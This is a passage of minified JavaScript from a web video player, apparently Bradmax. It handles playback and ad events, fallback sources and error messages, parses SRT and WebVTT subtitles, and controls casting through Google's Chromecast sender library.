b},onPlayEvent:function(b){this.initAdVideoTagForMobilesAndPropagate()&&(this.shouldVideoPlay=!0,this.playerInstance.play())},onPlayPauseEvent:function(b){this.initAdVideoTagForMobilesAndPropagate()&&(this.shouldVideoPlay=!this.shouldVideoPlay,this.playerInstance.playPause())},onSeekEvent:function(b){null!=this.playerInstance&&this.playerInstance.seek(b.data)},onSelectAudioEvent:function(b){},onSelectSubtitlesEvent:function(b){},onVolumeEvent:function(b){this.volumeValue=parseFloat(b.data),null!=this.playerInstance&&(this.htmlVideo.muted=0>=this.volumeValue,this.playerInstance.volume(this.volumeValue)),null!=this.adPlayerInstance&&(this.htmlAdVideo.muted=0>=this.volumeValue,this.adPlayerInstance.volume(this.volumeValue))},onMuteEvent:function(b){this.htmlVideo.muted=this.htmlAdVideo.muted=!0},onUnmuteEvent:function(b){this.htmlVideo.muted=this.htmlAdVideo.muted=!1,this.htmlVideo.volume=0==this.htmlVideo.volume?1:this.htmlVideo.volume,this.htmlAdVideo.volume=0==this.htmlAdVideo.volume?1:this.htmlAdVideo.volume},onAdPlay:function(b){null!=this.adPlayerInstance&&(this.shouldVideoPlay=!0,this.adPlayerInstance.play())},onAdPause:function(b){null!=this.adPlayerInstance&&(this.shouldVideoPlay=!1,this.adPlayerInstance.pause())},onAdResume:function(b){null!=this.adPlayerInstance&&(this.shouldVideoPlay=!0,this.adPlayerInstance.play())},onVideoPlaying:function(b){this.isSingleVideoTagPlay()||(null!=this.htmlVideo&&(this.htmlVideo.classList.add("showElement"),this.htmlVideo.classList.remove("hideElement")),null!=this.htmlAdVideo&&(this.htmlAdVideo.classList.add("hideElement"),this.htmlAdVideo.classList.remove("showElement")))},hasFallbackSourceToCheck:function(){var b=null!=this.currentMedia&&null!=this.currentMedia.source&&0<this.currentMedia.source.length&&Object.prototype.hasOwnProperty.call(this.currentMedia.source[0].customParams.h,"yospaceStream");return b=null==this.currentMedia.drmCustomLicenseServerHandler||h.isSamsungSmartTVTizen||b,!(null==this.currentMedia||!this.currentMedia.hasFallbackSources()||null==this.lastDataProviderEvent)&&b},reloadVideoWithNextFallbackSource:function(){var b=null!=this.nativeAdVideo&&null!=this.nativeAdVideo.src&&!this.nativeAdVideo.paused;b&&(this.shouldVideoPlay=!1),this.log("BRADMAX PLAYER NOTICE:\nError occurred during video load. Trying to load next fallback video.\n","warn");var c=new T("mediaErrorUsingFallbackSource");c.data=this.currentMedia,c.dispatch(this.context),this.currentMedia.useFallbackSources(),this.shouldVideoPlay||1!=this.get_variables().autoplay||(this.get_variables().autoplay=!1),this.lastDataProviderEvent.dispatch(this.context),b&&new Q("adPlaying").dispatch(this.context),this.shouldVideoPlay&&new W("skinPlay").dispatch(this.context)},reloadVideoWithNextSupportedPlayer:function(){this.log("BRADMAX PLAYER NOTICE:\nError occurred during video playback. Trying to use fallback player.\n","warn");var b=fb.getClass(this.playerInstance).__name__;this.currentMedia.failedPlaybackPlayers.h[b]=b,this.lastDataProviderEvent.dispatch(this.context),new W("skinPlay").dispatch(this.context)},reloadVideoAfterNetworkProblem:function(){if(new ma(ma.CLOSE_MESSAGE).dispatch(this.context),null!=this.playerInstance&&(this.playerInstance.destroy(),this.playerInstance=null),null!=this.adPlayerInstance&&(this.adPlayerInstance.destroy(),this.adPlayerInstance=null),null!=this.lastDataProviderEvent){if(this.lastDataProviderEvent.data instanceof va&&0<this.videoCurrentTime){var b=this.lastDataProviderEvent.data;null!=b.mediaUserSettings&&(b.mediaUserSettings.resumePostion=this.videoCurrentTime)}this.lastDataProviderEvent.dispatch(this.context)}new W("skinPlay").dispatch(this.context)},onNetworkErrorEvent:function(b){this.stopPermamentPlaybackErrorTimer(),this.hasFallbackSourceToCheck()?this.reloadVideoWithNextFallbackSource():this.showNetworkTemporaryErrorMessage(b)},onVideoErrorEvent:function(b){this.lastMediaError=b,this.stopPermamentPlaybackErrorTimer(),this.hasFallbackSourceToCheck()?this.hasInStreamAds()?Rb.delay(U(this,this.reloadVideoWithNextFallbackSource),0):this.reloadVideoWithNextFallbackSource():h.isAndroid?this.reloadVideoWithNextSupportedPlayer():(this.showMediaErrorMessage(b),this.playerInstance.pause())},onAdErrorEvent:function(b){this.hasFallbackSourceToCheck()?this.hasInStreamAds()?Rb.delay(U(this,this.reloadVideoWithNextFallbackSource),0):this.reloadVideoWithNextFallbackSource():h.isAndroid?this.reloadVideoWithNextSupportedPlayer():(this.showMediaErrorMessage(b),this.playerInstance.pause())},onVideoDrmAuthError:function(b){this.stopPermamentPlaybackErrorTimer();var c=new T("playbackPermamentError");c.data=b.data,c.dispatch(this.context)},onVideoDrmModuleCrush:function(b){this.stopPermamentPlaybackErrorTimer();var c=new T("playbackPermamentError");c.data=b.data,c.dispatch(this.context)},showMediaErrorMessage:function(b){var c=new ma(ma.SHOW_MESSAGE);c.data={type:"normal",title:Yb.translate("error"),text:Yb.translate("cannot_decode_media"),textDetails:this.getVideoEventErrorMessage(b),close:!1},c.dispatch(this.context),this.startPermamentPlaybackErrorTimer()},showNetworkPermamentErrorMessage:function(b){var c=new ma(ma.SHOW_MESSAGE);c.data={type:"normal",title:Yb.translate("error"),text:Yb.translate("connection_error_permanent"),textDetails:this.getVideoEventErrorMessage(b),close:!1},c.dispatch(this.context),this.startPermamentPlaybackErrorTimer()},showNetworkTemporaryErrorMessage:function(b){var c=new ma(ma.SHOW_MESSAGE);c.data={type:"normal",title:Yb.translate("error"),text:Yb.translate("connection_error"),textDetails:this.getVideoEventErrorMessage(b),userSingleActionButtonText:Yb.translate("try_again"),onUserSingleAction:U(this,this.reloadVideoAfterNetworkProblem),close:!1},c.dispatch(this.context),new T("connectionErrorWaitingForUserAction").dispatch(this.context),this.stopPermamentPlaybackErrorTimer()},startPermamentPlaybackErrorTimer:function(){this.stopPermamentPlaybackErrorTimer();var b=6e3;Object.prototype.hasOwnProperty.call(this.pluginConfig,"permamentPlaybackErrorSafetyWindow")&&0<this.pluginConfig.permamentPlaybackErrorSafetyWindow&&(b=this.pluginConfig.permamentPlaybackErrorSafetyWindow),this.permamentPlaybackErrorTimer=Rb.delay(U(this,this.onPermamentPlaybackErrorTimer),b)},stopPermamentPlaybackErrorTimer:function(){null!=this.permamentPlaybackErrorTimer&&(this.permamentPlaybackErrorTimer.stop(),this.permamentPlaybackErrorTimer=null)},onPermamentPlaybackErrorTimer:function(){this.stopPermamentPlaybackErrorTimer();var b=new T("playbackPermamentError");null!=this.lastMediaError&&(b.data=this.lastMediaError.data),b.dispatch(this.context)},getVideoEventErrorMessage:function(b){if(0==m.field(this.get_variables(),"showErrorDetails"))return"";var c=Yb.translate("details");if(null!=this.playerInstance){var d=fb.getClass(this.playerInstance).__name__.split(".");c+=" ["+d[d.length-1]+"]"}return c+=":\n",null!=b&&null!=b.data&&null!=b.data.additionalData&&null!=b.data.additionalData.message&&(c+=p.string(b.data.additionalData.message)),c},onVideoTimeChange:function(b){null!=b&&null!=b.data&&(this.videoCurrentTime=b.data.currentTime)},onAdVideoPlaying:function(b){this.isInStreamAdPlaying||this.isSingleVideoTagPlay()||(this.htmlVideo.classList.add("hideElement"),this.htmlVideo.classList.remove("showElement"),this.htmlAdVideo.classList.add("showElement"),this.htmlAdVideo.classList.remove("hideElement"))},onAdInStreamPlaying:function(b){this.isInStreamAdPlaying=!0},onAdInStreamEnd:function(b){this.isInStreamAdPlaying=!1},eventFilter:function(b){var c=b instanceof T;return c&&"connectionError"==b.type&&this.hasFallbackSourceToCheck()?(this.onNetworkErrorEvent(b),!1):c&&("mediaError"==b.type||"loadError"==b.type)&&this.hasFallbackSourceToCheck()?(this.onVideoErrorEvent(b),!1):lb.prototype.eventFilter.call(this,b)},getSupportRateForUrls:function(b){for(var c=[],d=0;d<b.length;){var q=b[d];++d;for(var X=0,ra=0,Aa=this.videoPlayersClasses.length;ra<Aa;){var Qa=ra++,Wa=this.videoPlayersClasses[Qa],Cb=new Da;Cb.url=q,Wa.canPlay(Cb)&&(X=Qa+1)}c.push(X)}return c},__class__:kd});var of=function(b,c){this.context=b,this.areListenersAttached=!1,this.renderer=c,this.hasPlaybackStarted=!1,this.activeEntries=new re};wa["bs.player.plugin.video.caption.ExternalSubtitlesController"]=of,of.__name__="bs.player.plugin.video.caption.ExternalSubtitlesController",of.prototype={media:null,context:null,areListenersAttached:null,selectedSubtitlesSet:null,currentTime:null,activeEntries:null,hasPlaybackStarted:null,renderer:null,setData:function(b){this.media=b,this.hasPlaybackStarted=!1,this.selectedSubtitlesSet=null,this.hasMediaExternalSubtitles(b)?this.attachListeners():this.detachListeners()},hasMediaExternalSubtitles:function(b){if(null!=b.subtitlesSets){var c=0;for(b=b.subtitlesSets;c<b.length;){var d=b[c];if(++c,null!=d.url&&(this.isExtensionSrt(d.url)||this.isExtensionVtt(d.url)))return!0}}return!1},isExtensionSrt:function(b){return b=this.stripQueryParams(b),!!f.endsWith(b,".srt")||f.endsWith(b,".SRT")},isExtensionVtt:function(b){return b=this.stripQueryParams(b),!!(f.endsWith(b,".vtt")||f.endsWith(b,".VTT")||f.endsWith(b,".webvtt"))||f.endsWith(b,".WEBVTT")},stripQueryParams:function(b){return null!=b&&(b=b.replace(/[?#].*/,"")),b},attachListeners:function(){this.areListenersAttached||(W.add(this.context,"selectSubtitles",U(this,this.onSelectSubtitles)),T.add(this.context,"playing",U(this,this.onPlayEvent)),T.add(this.context,"currentTimeChange",U(this,this.onTimeupdate)),this.areListenersAttached=!0)},detachListeners:function(){this.areListenersAttached&&(W.remove(this.context,"selectSubtitles",U(this,this.onSelectSubtitles)),T.remove(this.context,"playing",U(this,this.onPlayEvent)),T.remove(this.context,"currentTimeChange",U(this,this.onTimeupdate)),this.areListenersAttached=!1)},onPlayEvent:function(b){this.hasPlaybackStarted=!0,this.loadSelectedSubtitles()},onSelectSubtitles:function(b){if(null!=b){for(var c=this.activeEntries.h;null!=c;){var d=c.item;c=c.next,this.renderer.onCueExit(d)}this.activeEntries.clear(),this.selectSubtitlesSet(b.data)}},selectSubtitlesSet:function(b){null!=b&&null!=b.url&&(this.isExtensionSrt(b.url)||this.isExtensionVtt(b.url))?(this.selectedSubtitlesSet=b,this.loadSelectedSubtitles()):this.selectedSubtitlesSet=null},loadSelectedSubtitles:function(){if(this.hasPlaybackStarted&&null!=this.selectedSubtitlesSet&&null==this.selectedSubtitlesSet.subtitleEntries){var b=new L(this.selectedSubtitlesSet.url);b.onData=U(this,this.onLoadExternalSubtitlesSuccess),b.onError=U(this,this.onLoadExternalSubtitlesError),b.request()}},onTimeupdate:function(b){if(null!=b&&null!=b.data&&null!=this.selectedSubtitlesSet&&null!=this.selectedSubtitlesSet.subtitleEntries){this.currentTime=b.data.currentTime;for(var c=new re,d=this.activeEntries.h;null!=d;){b=d.item,d=d.next;var q=this.currentTime;b.showTime<=q&&q<b.hideTime||(this.renderer.onCueExit(b),c.add(b))}for(c=c.h;null!=c;)b=c.item,c=c.next,this.activeEntries.remove(b);for(c=this.findEntriesByTime(this.currentTime),d=0;d<c.length;)b=c[d],++d,this.isEntryOnList(b,this.activeEntries)||(this.activeEntries.push(b),this.renderer.onCueEnter(b))}},isEntryOnList:function(b,c){for(c=c.h;null!=c;){var d=c.item;if(c=c.next,d==b)return!0}return!1},findEntriesByTime:function(b){for(var c=[],d=this.selectedSubtitlesSet.subtitleEntries,q=0,X=d.length,ra=Math.floor((q+X)/2);q<X;)b<d[ra].showTime?X=ra-1:q=ra+1,ra=Math.floor((q+X)/2);for(q=ra-1;0<=q?X=(X=d[q]).showTime<=b&&b<X.hideTime:X=!1,X;)c.unshift(d[q]),--q;for(q=ra;q<d.length?X=(X=d[q]).showTime<=b&&b<X.hideTime:X=!1,X;)c.push(d[q]),++q;return c},isTimeInclidedInEntry:function(b,c){return c.showTime<=b&&b<c.hideTime},destroy:function(){this.detachListeners()},onLoadExternalSubtitlesSuccess:function(b){var c=this.isExtensionSrt(this.selectedSubtitlesSet.url)?new ce:new Ce;try{this.selectedSubtitlesSet.subtitleEntries=c.parse(b)}catch(d){if(!((b=yb.caught(d).unwrap())instanceof td))throw d;b="Cannot load subtitles file. Parse error. \n"+p.string(b.message),console.error(b)}},onLoadExternalSubtitlesError:function(b){console.error("Cannot load external subtitles file "+this.selectedSubtitlesSet.url+".")},__class__:of};var Ye=function(){};wa["bs.player.plugin.video.caption.SubtitlesParserInterface"]=Ye,Ye.__name__="bs.player.plugin.video.caption.SubtitlesParserInterface",Ye.__isInterface__=!0,Ye.prototype={parse:null,__class__:Ye};var ce=function(){this.timeEntriesSeparator=" --\x3e ",this.lineNumber=0,this.lines=null,this.endLinesRegexp=new u("(\r\n)|(\n)","g"),this.milisecondsSeparatorRegexp=new u("[,\\.]","g"),this.whiteSpacesRegexp=new u("[ \t\r\n]+","g")};wa["bs.player.plugin.video.caption.SrtSubtitlesParser"]=ce,ce.__name__="bs.player.plugin.video.caption.SrtSubtitlesParser",ce.__interfaces__=[Ye],ce.prototype={lineNumber:null,lines:null,endLinesRegexp:null,timeEntriesSeparator:null,milisecondsSeparatorRegexp:null,whiteSpacesRegexp:null,readLine:function(){var b=this.lines[this.lineNumber];return this.lineNumber++,null!=b&&0==this.lineNumber?f.replace(b,"\ufeff",""):b},isFileEnd:function(){return this.lineNumber>=this.lines.length},isEmptyStr:function(b){return null==b||""==b},skipEmptyLines:function(){for(var b=this.readLine();this.isEmptyStr(b)&&!this.isFileEnd();)b=this.readLine();this.isFileEnd()||this.lineNumber--},parseEntry:function(){var b=new db,c=this.readLine();if(this.isEmptyStr(c))throw yb.thrown(new td("Error in line: "+this.lineNumber+". Cannot parse entry number."));if(c=this.readLine(),this.isEmptyStr(c))throw yb.thrown(new td("Error in line: "+this.lineNumber+". Cannot parse time for entry."));if(2!=(c=(c=c.replace(this.whiteSpacesRegexp.r," ")).split(this.timeEntriesSeparator)).length)throw yb.thrown(new td("Error in line: "+this.lineNumber+". Cannot parse time for entry."));for(b.showTime=this.parseTime(c[0]),b.hideTime=this.parseTime(c[1]),b.texts=[],c=this.readLine();!this.isEmptyStr(c);){var d=new Za;d.text=f.trim(c),b.texts.push(d),c=this.readLine()}if(0==b.texts.length)throw yb.thrown(new td("Error in line: "+this.lineNumber+". No text for entry."));return b},parseTime:function(b){if(null==b)throw yb.thrown(new td("Error in line: "+this.lineNumber+". Cannot parse time for entry."));var c=this.milisecondsSeparatorRegexp.split(b);if(b=0,1<c.length&&(b=p.parseInt(c[1])),3!=(c=c[0].split(":")).length)throw yb.thrown(new td("Error in line: "+this.lineNumber+". Cannot parse time for entry."));var d=3600*p.parseInt(c[0]);return d+=60*p.parseInt(c[1]),(d+=p.parseInt(c[2]))+b/1e3},parse:function(b){for(this.lines=this.endLinesRegexp.split(b),this.lineNumber=0,this.skipEmptyLines(),b=[];!this.isFileEnd();)b.push(this.parseEntry()),this.skipEmptyLines();return b},__class__:ce};var td=function(b){this.message=b};wa["bs.player.plugin.video.caption.SubtitlesParserError"]=td,td.__name__="bs.player.plugin.video.caption.SubtitlesParserError",td.prototype={message:null,__class__:td};var Ce=function(){ce.call(this)};wa["bs.player.plugin.video.caption.VttSubtitlesParser"]=Ce,Ce.__name__="bs.player.plugin.video.caption.VttSubtitlesParser",Ce.__super__=ce,Ce.prototype=Ja(ce.prototype,{parse:function(b){if(this.lines=this.endLinesRegexp.split(b),this.lineNumber=0,this.skipEmptyLines(),b=this.readLine(),b=f.trim(b),65279==da.cca(b,0)&&(b=da.substr(b,1,null)),"WEBVTT"!=b)throw yb.thrown(new td("Error in line: "+this.lineNumber+". WEBVTT text expected in first line."));for(this.skipEmptyLines(),b=[];!this.isFileEnd();)b.push(this.parseEntry()),this.skipEmptyLines();return b},__class__:Ce});var Jc=function(b,c,d){this.applicationId=this.context=this.remotePlayer=this.remotePlayerController=null,this.context=b,this.onApiLoadListener=c,this.applicationId=d,null==this.applicationId&&(this.applicationId="53001214"),this.isConnected=!1,null==Jc.instances&&(Jc.instances=[]),Jc.instances.push(this),Jc.libLoaded||(Jc.libLoaded=!0,this.checkScriptLoad(),this.loadScript()),W.add(b,"chromecast",U(this,this.onChromecast)),Jc._isAvailable&&(this.onCastApiInitialization(),null!=c&&Rb.delay(c,0))};wa["bs.player.plugin.video.chromecast.ChromecastSender"]=Jc,Jc.__name__="bs.player.plugin.video.chromecast.ChromecastSender",Jc.initializeCastApi=function(b){(Jc._isAvailable=b)&&(null==(b=Jc.instances[0]).getCast()||null==b.getChromeCast()?Jc._isAvailable=!1:b.onCastApiInitialization());for(var c=0,d=Jc.instances;c<d.length;)b=d[c],++c,null!=b.onApiLoadListener&&b.onApiLoadListener()},Jc.prototype={applicationId:null,context:null,remotePlayer:null,remotePlayerController:null,castSession:null,onApiLoadListener:null,monitorSessionTimer:null,monitorSessionCreationTimer:null,isConnected:null,isAvailable:null,get_isAvailable:function(){return Jc._isAvailable},onChromecast:function(b){this.getChromeCast().requestSession(),this.createSession()},connect:function(){if(!this.isConnected){this.isConnected=!0;var b=new ja(ja.CONNECTED);b.data={session:this.castSession,sender:this},b.dispatch(this.context),new T("videoCastingStart").dispatch(this.context)}},disconnect:function(){if(this.isConnected){this.isConnected=!1,this.castSession=null;var b=new ja(ja.DISCONNECTED);b.data={},b.dispatch(this.context),new T("videoCastingEnd").dispatch(this.context),this.getCast().framework.CastContext.getInstance().endCurrentSession(!0)}},createSession:function(){null==this.castSession&&this.monitorSessionCreation()},monitorSessionCreation:function(){null==this.castSession&&(this.castSession=this.getCast().framework.CastContext.getInstance().getCurrentSession()),null==this.castSession?this.monitorSessionCreationTimer=Rb.delay(U(this,this.monitorSessionCreation),500):(this.connect(),this.monitorSessionTimer=new Rb(1e3),this.monitorSessionTimer.run=U(this,this.monitorSession))},monitorSession:function(){null!=this.castSession&&"SESSION_ENDED"!=this.castSession.getSessionState()||(null!=this.monitorSessionTimer&&this.monitorSessionTimer.stop(),this.disconnect())},newRemotePlayerController:function(b){return new cast.framework.RemotePlayerController(b)},newRemotePlayer:function(){return new cast.framework.RemotePlayer},newLoadRequest:function(b){return new chrome.cast.media.LoadRequest(b)},newMediaInfo:function(b,c){return new chrome.cast.media.MediaInfo(b,c)},newGenericMediaMetadata:function(){return new window.chrome.cast.media.GenericMediaMetadata},newImage:function(b){return new window.chrome.cast.Image(b)},castMediaImage:function(b){var c=this.newImage(b.url);if(null!=b.width){var d=b.width;d=!isNaN(d)}else d=!1;return d&&(c.width=b.width),null!=b.height?(d=b.height,d=!isNaN(d)):d=!1,d&&(c.height=b.height),c},onCastApiInitialization:function(){null==this.getCast().framework?console.warn("Cannot start Chromecast. Try restart browser and Chromecast device."):this.getCast().framework.CastContext.getInstance().setOptions({receiverApplicationId:this.applicationId,autoJoinPolicy:this.getChromeCast().AutoJoinPolicy.ORIGIN_SCOPED})},getChromeCast:function(){return chrome.cast},getChrome:function(){return chrome},getCast:function(){return cast},checkScriptLoad:function(){window.__onGCastApiAvailable=Jc.initializeCastApi},loadScript:function(){var b=document.getElementsByTagName("head")[0],c=document.createElement("script");c.type="text/javascript",c.src="https://www.gstatic.com/cv/js/sender/v1/cast_sender.js?loadCastFramework=1",b.appendChild(c)},destroy:function(){if(this.disconnect(),null!=Jc.instances){var b=Jc.instances.indexOf(this);0<=b&&Jc.instances.splice(b,1)}},__class__:Jc,__properties__:{get_isAvailable:"get_isAvailable"}};var Nc=function(b){this.state=0,this.castSession=null,this.isAdvertisement=this.isSeeking=!1,this.minAudioTracksForInfo=2,null==Nc.instances.h[(b?"ad_":"")+this.context]&&(this.volumeLevel=1,this.isAdvertisement=b)};wa["bs.player.plugin.video.chromecast.ChromecastVideo"]=Nc,Nc.__name__="bs.player.plugin.video.chromecast.ChromecastVideo",Nc.__interfaces__=[S],Nc.canPlay=function(b){return!0},Nc.getInstance=function(b,c){var d=c?"ad_":"";return Object.prototype.hasOwnProperty.call(Nc.instances.h,d+b)?Nc.instances.h[d+b]:(c=new Nc(c),Nc.instances.h[d+b]=c,c.context=b,c.create(),c)},Nc.prototype={minAudioTracksForInfo:null,context:null,variables:null,isAdvertisement:null,isSeeking:null,media:null,mediaVmapResponse:null,mediaVmapUrl:null,sender:null,remotePlayer:null,remotePlayerController:null,castSession:null,state:null,volumeLevel:null,setupMediaTimeoutTimer:null,desiredPlaybackRate:null,currentPlaybackRate:null,setSession:function(b,c){this.castSession=b,this.sender=c,W.add(this.context,"skinVolume",U(this,this.onVolumeChange)),W.add(this.context,"skinMute",U(this,this.onMuteChange)),W.add(this.context,"skinUnmute",U(this,this.onUnMuteChange)),null!=this.castSession&&(this.state=10,this.setupMedia())},setPlaybackRate:function(b){this.isAdvertisement||this.currentPlaybackRate==b||(this.desiredPlaybackRate=b,null!=this.castSession&&(null!=(b=this.castSession.getMediaSession())&&this.castSession.sendMessage("urn:x-cast:com.google.cast.media",{type:"SET_PLAYBACK_RATE",playbackRate:this.desiredPlaybackRate,mediaSessionId:b.mediaSessionId,requestId:1}).then((function(c){})).catch((function(c){console.error("Set playback rate error: "+c)}))))},getPlaybackRate:function(){return this.isAdvertisement?1:this.currentPlaybackRate},triggerVideoPlaybackRateEvent:function(){if(!this.isAdvertisement){var b=new T("playbackRate");b.data=this.getPlaybackRate(),b.dispatch(this.context)}},setupMedia:function(){if(null!=this.media&&null!=this.media.source&&0<this.media.source.length&&null!=this.castSession&&null!=this.sender){this.state=20;var b=this.sender.newMediaInfo(this.media.source[0].url);b.metadata=this.sender.newGenericMediaMetadata(),b.metadata.title=this.media.title;for(var c=[],d=0,q=(null!=this.media.splashImages?this.media.splashImages:[]).concat(null!=this.media.posterImages?this.media.posterImages:[]);d<q.length;){var X=q[d];++d,null!=X&&c.push(X)}for(q=c,c=[],d=0;d<q.length;)X=q[d],++d,c.push(this.sender.castMediaImage(X));b.metadata.images=c,b.customData={statsId:this.media.id,statsTitle:this.media.title},null==this.mediaVmapResponse&&null==this.mediaVmapUrl||(c={},null!=this.mediaVmapResponse?c.adsResponse=this.mediaVmapResponse:c.adTagUrl=this.mediaVmapUrl,b.vmapAdsRequest=c),(b=this.sender.newLoadRequest(b)).autoplay=this.media.mediaPlaybackInfo.isPlaying,0<this.media.mediaPlaybackInfo.currentTime&&(b.currentTime=this.media.mediaPlaybackInfo.currentTime),null!=this.desiredPlaybackRate&&!isNaN(this.desiredPlaybackRate)&&.5<=this.desiredPlaybackRate&&(b.playbackRate=this.desiredPlaybackRate),b=this.castSession.loadMedia(b),this.setupMediaTimeoutTimer=Rb.delay(U(this,this.onRemoteMediaSetupTimeout),12e3),b.then(U(this,this.onRemoteMediaLoad),U(this,this.onRemoteMediaError)).catch(U(this,this.onRemoteMediaError))}},stopSetupMediaTimeoutTimer:function(){null!=this.setupMediaTimeoutTimer&&(this.setupMediaTimeoutTimer.stop(),this.setupMediaTimeoutTimer=null)},onRemoteMediaSetupTimeout:function(){this.stopSetupMediaTimeoutTimer(),this.onRemoteMediaError({description:'Chromecast cannot initialize remote media. Probably Chromecast is blocking playback because of more restricted CORS policy (no wildcard "*" is allowed). Please check page if you are a stream provider: https://developers.google.com/cast/docs/chrome_sender/advanced#cors_requirements '})},onRemoteMediaError:function(b){this.stopSetupMediaTimeoutTimer();var c="";null!=b&&null!=b.code&&(c+="errorCode: "+p.string(b.code)),null!=b&&null!=b.description&&(c+=" description: "+p.string(b.description)),this.dispatchEvent(this.isAdvertisement?new Q("adConnectionError"):new T("connectionError"),{errObj:b,isTemporaryNetworkIssue:!1,message:c}),this.sender.disconnect()},onRemoteMediaLoad:function(){this.stopSetupMediaTimeoutTimer(),new T("videoCastingStart").dispatch(this.context),this.remotePlayer=this.sender.newRemotePlayer(),this.remotePlayerController=this.sender.newRemotePlayerController(this.remotePlayer),this.state=30,0<this.media.mediaPlaybackInfo.currentTime&&this.remotePlayer.canSeek&&this.seek(this.media.mediaPlaybackInfo.currentTime),this.volume(this.volumeLevel),this.dispatchEvent(this.isAdvertisement?new Q("adPlaying"):new T("playing")),this.media.mediaPlaybackInfo.isPlaying||this.dispatchEvent(this.isAdvertisement?new Q("adPaused"):new T("paused")),this.dispatchEvent(this.isAdvertisement?new Q("adDurationChange"):new T("durationChange"));var b=this.sender.getCast().framework.RemotePlayerEventType;this.remotePlayerController.addEventListener(b.CURRENT_TIME_CHANGED,U(this,this.onRemoteTimeChange)),this.remotePlayerController.addEventListener(b.DURATION_CHANGED,U(this,this.onRemoteDurationChange)),this.remotePlayerController.addEventListener(b.IS_PAUSED_CHANGED,U(this,this.onRemotePauseChange)),this.remotePlayerController.addEventListener(b.MEDIA_INFO_CHANGED,U(this,this.onRemoteMediaInfoChange))},onRemoteTimeChange:function(){null!=this.remotePlayer&&null!=this.remotePlayerController&&this.remotePlayer.isConnected&&(this.dispatchEvent(this.isAdvertisement?new Q("adCurrentTimeChange"):new T("currentTimeChange")),this.isSeeking&&(this.isSeeking=!1,this.dispatchEvent(this.isAdvertisement?new Q("seekingEnd"):new T("seekingEnd"))),this.remotePlayer.isPaused&&this.dispatchEvent(this.isAdvertisement?new Q("adPaused"):new T("paused")))},onRemoteDurationChange:function(){null!=this.remotePlayer&&null!=this.remotePlayerController&&this.remotePlayer.isConnected&&(this.dispatchEvent(this.isAdvertisement?new Q("adDurationChange"):new T("durationChange")),0==this.remotePlayer.duration&&null==this.remotePlayer.mediaInfo&&this.dispatchEvent(this.isAdvertisement?new Q("adComplete"):new T("complete")))},onRemotePauseChange:function(){null!=this.remotePlayer&&null!=this.remotePlayerController&&this.remotePlayer.isConnected&&(this.remotePlayer.isPaused?this.dispatchEvent(this.isAdvertisement?new Q("adPaused"):new T("paused")):this.dispatchEvent(this.isAdvertisement?new Q("adPlaying"):new T("playing")))},onRemoteMediaInfoChange:function(){if(null!=this.remotePlayer&&null!=this.remotePlayerController&&this.remotePlayer.isConnected){if(null!=this.castSession){var b=this.castSession.getMediaSession();null!=b&&(b=b.playbackRate,!isNaN(b)&&0<b&&b!=this.currentPlaybackRate&&(this.currentPlaybackRate=b,this.triggerVideoPlaybackRateEvent()))}this.hasVideoComplete()&&(this.state=10,this.dispatchEvent(this.isAdvertisement?new Q("adComplete"):new T("complete")))}},onChromecastDisonnect:function(){if(null!=this.mediaVmapResponse&&null!=this.variables.freewheel){this.variables.freewheel.testFeed=this.mediaVmapResponse;var b=new Q("feedUpdate");b.data=this.mediaVmapResponse,b.dispatch(this.context)}null!=this.mediaVmapUrl&&null!=this.variables.freewheel&&(this.variables.freewheel.testFeedUrl=this.mediaVmapUrl,(b=new Q("feedUpdate")).data=this.mediaVmapUrl,b.dispatch(this.context)),null!=this.media&&null!=this.media.mediaPlaybackInfo&&0<this.media.mediaPlaybackInfo.currentTime&&(this.media.mediaUserSettings.resumePostion=this.media.mediaPlaybackInfo.currentTime),W.remove(this.context,"skinVolume",U(this,this.onVolumeChange)),W.remove(this.context,"skinMute",U(this,this.onMuteChange)),W.remove(this.context,"skinUnmute",U(this,this.onUnMuteChange)),null!=this.remotePlayerController&&(b=this.sender.getCast().framework.RemotePlayerEventType,this.remotePlayerController.removeEventListener(b.CURRENT_TIME_CHANGED,U(this,this.onRemoteTimeChange)),this.remotePlayerController.removeEventListener(b.DURATION_CHANGED,U(this,this.onRemoteDurationChange)),this.remotePlayerController.removeEventListener(b.IS_PAUSED_CHANGED,U(this,this.onRemotePauseChange)),this.remotePlayerController.removeEventListener(b.MEDIA_INFO_CHANGED,U(this,this.onRemoteMediaInfoChange))),this.state=0,this.remotePlayerController=this.remotePlayer=this.media=null},dispatchEvent:function(b,c){var d=0,q=0;null!=this.remotePlayer&&(d=this.remotePlayer.duration,0==(q=this.remotePlayer.currentTime)&&null!=this.remotePlayer.savedPlayerState&&(q=this.remotePlayer.savedPlayerState.currentTime,d=this.remotePlayer.savedPlayerState.mediaInfo.duration)),null!=this.media&&(this.media.mediaPlaybackInfo.currentTime=q,this.media.mediaPlaybackInfo.isPlaying=null!=this.remotePlayer&&!this.remotePlayer.isPaused,this.media.mediaPlaybackInfo.playbackRate=this.getPlaybackRate()),null==b.data&&(b.data={}),b.data.duration=d,b.data.currentTime=q,b.data.media=this.media,b.data.additionalData=c,b.dispatch(this.context)},create:function(){},destroy:function(){},attachVideo:function(b){},attachSubtitlesRenderer:function(b){},playerResize:function(b){},videoReady:function(){},onDurationChange:function(b){},pause:function(){null!=this.remotePlayer&&null!=this.remotePlayerController&&(this.remotePlayer.isPaused||this.remotePlayerController.playOrPause())},play:function(){null!=this.remotePlayer&&null!=this.remotePlayerController&&this.remotePlayer.isPaused&&(this.hasVideoComplete()?(this.media.mediaPlaybackInfo.isPlaying=!0,this.setupMedia()):this.remotePlayerController.playOrPause())},playPause:function(){this.hasVideoComplete()?(this.media.mediaPlaybackInfo.isPlaying=!0,this.setupMedia()):null!=this.remotePlayerController&&this.remotePlayerController.playOrPause()},hasVideoComplete:function(){return null!=this.media&&null!=this.remotePlayer&&null==this.remotePlayer.mediaInfo&&null!=this.castSession&&10<=this.state&&(null==this.remotePlayer.savedPlayerState||0<this.remotePlayer.savedPlayerState.duration&&this.remotePlayer.savedPlayerState.currentTime>=this.remotePlayer.savedPlayerState.duration-1)},reset:function(){},seek:function(b){null!=this.remotePlayer&&null!=this.remotePlayerController&&(this.remotePlayer.currentTime=b,this.remotePlayerController.seek(),this.isSeeking=!0,this.dispatchEvent(this.isAdvertisement?new Q("seekingStart"):new 